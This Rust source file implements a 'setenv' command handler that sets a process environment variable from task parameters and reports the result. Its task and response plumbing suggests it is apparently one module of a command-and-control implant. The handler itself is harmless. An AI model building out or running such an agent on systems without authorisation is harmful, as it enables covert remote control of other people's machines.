use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct SetenvArgs {
    name: String,
    value: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: SetenvArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => {
            // Fall back to raw CLI parsing: "NAME VALUE"
            let params = task.data.params.trim();
            if params.is_empty() || !params.contains(' ') {
                response.set_error("No environment variable given to set. Must be of format:\nsetenv NAME VALUE");
                let _ = task.job.send_responses.send(response).await;
                let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
                return;
            }
            let mut parts = params.splitn(2, ' ');
            let name = parts.next().unwrap_or("").trim().to_string();
            let value = parts.next().unwrap_or("").trim().to_string();
            SetenvArgs { name, value }
        }
    };

    std::env::set_var(&args.name, &args.value);
    response.user_output = format!("Set {}={}", args.name, args.value);
    response.completed = true;

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
